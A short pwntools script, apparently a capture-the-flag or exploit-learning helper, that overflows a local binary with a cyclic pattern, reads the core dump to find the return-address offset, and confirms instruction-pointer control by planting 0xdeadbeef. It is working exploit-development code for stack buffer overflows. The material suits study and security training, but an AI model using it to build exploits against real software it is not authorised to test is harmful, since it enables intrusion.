#!/usr/bin/python3

from pwn import *
import sys


def find_offset( length ):
    exe = sys.argv[ 1 ]

    log.info( f"finding offset, sending cyclic of size {length}..." )

    pattern = cyclic( length )
    p = process( exe )

    # You may need to do some modification here!
    # For example, if the binary says "Enter your name: ", you'll need to 
    # receive until you see that prompt, and then send your payload.
    # i.e p.recvuntil( "Enter your name: " )
    p.sendline( pattern )
    p.wait()

    core = Coredump( './core' )
    return cyclic_find( core.fault_addr, n = 4 )

def verify_offset( offset ):
    exe = sys.argv[ 1 ]
    context.binary = exe

    log.info( f"verifying offset, sending deadbeef..." )

    padding = b'A' * offset
    payload = padding + p64( 0xdeadbeef )

    p = process( exe )
    p.sendline( payload )
    p.wait()

    core = Coredump( './core' )
    if core.fault_addr == 0xdeadbeef:
        log.success( f"offset verified, we have control of eip now!" )
        log.info(f"offset: {offset}")
        log.info(f"eip/rip: {hex(core.fault_addr)}")
    
    else:
        log.error( f"offset incorrect, expected 0xdeadbeef at offset {offset}, got {hex(core.fault_addr)}" )


if __name__ == "__main__":

    if len ( sys.argv ) < 3:
        print( f"Usage: {sys.argv[0]} <binary> <cyclic_length>" )
        exit( 0 )
    
    exe = sys.argv[ 1 ]
    context.binary = exe
    context.log_level = 'info'

    cyclic_len = int( sys.argv[ 2 ] )
    
    offset = find_offset( cyclic_len )

    log.success( f"found offset: {offset} bytes\n" )

    verify_offset( offset )
